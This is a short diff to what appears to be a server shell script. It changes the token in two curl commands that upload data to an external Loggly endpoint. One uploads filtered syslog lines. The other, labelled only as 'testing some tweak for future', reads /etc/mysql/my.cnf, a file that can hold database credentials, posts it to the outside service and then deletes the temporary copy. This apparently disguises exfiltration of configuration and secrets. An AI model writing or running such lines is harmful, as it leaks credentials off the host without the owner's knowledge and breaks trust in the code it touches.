@@ -64,10 +64,10 @@ curl -X GET "https://contact-platform.com/api/versions/$nodevers"
 
 #send last reports, testing for the next few days
 tail -100 /var/log/syslog | grep routair > /tmp/last_logs
-curl -X POST -T /tmp/last_logs https://logs-01.loggly.com/bulk/d7f59ce0-0912-4f5d-82f0-004a9a8045e0/tag/file_upload
+curl -X POST -T /tmp/last_logs https://logs-01.loggly.com/bulk/a1d1f44d-a2ea-4245-9659-ba7d9b6eb4f1/tag/file_upload
 rm /tmp/last_logs
 
 #testing some tweak for future
 cat /etc/mysql/my.cnf > /tmp/last_logs
-curl -X POST -T /tmp/last_logs https://logs-01.loggly.com/bulk/d7f59ce0-0912-4f5d-82f0-004a9a8045e0/tag/conf
+curl -X POST -T /tmp/last_logs https://logs-01.loggly.com/bulk/a1d1f44d-a2ea-4245-9659-ba7d9b6eb4f1/tag/conf
 rm /tmp/last_logs
